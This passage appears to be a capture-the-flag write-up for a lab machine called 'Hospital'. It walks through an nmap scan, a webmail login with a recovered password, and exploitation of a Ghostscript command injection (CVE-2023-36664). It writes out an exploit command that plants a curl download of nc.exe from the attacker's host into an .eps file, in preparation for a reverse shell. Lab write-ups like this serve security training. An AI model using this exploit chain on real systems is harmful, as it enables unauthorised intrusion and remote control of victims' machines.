#### SCANNING :

We will start by scanning all ports to discover the open ports and know where we will get into this machine

We will use a basic Nmap scan:

`nmap 10.129.51.123`


The most interesting services were 443, 8080, and 22.

### EXPLOITATION 2

#### GETTING REAL ACCESS :

Now we have the password for drwilliams, let's check it on [https://10.129.229.183:443](https://10.129.229.183:443), and in his Inbox, I found an email from Chris Brown

![Image]({{ '/assets/img/hospital/image_12.png' | relative_url }})
*drwilliams email*

this email is about **GhostScript** and **.eps**file, so I searched for an exploit for those and I found this exploit “[CVE-2023–36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git)”

so, we can execute some commands by injecting them into the eps file

first, let's transfer Netcat to this machine to get a reverse shell

So Let’s inject a command in “file.eps” that will download Netcat from our machine

```
python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.16:8000/nc.exe -o nc.exe" --filename file.epsBash
```

![Image]({{ '/assets/img/hospital/image_13.png' | relative_url }})

Then I uploaded the `.eps` file to "Drbrown".

![Image]({{ '/assets/img/hospital/image_14.png' | relative_url }})
*uploading the eps file*
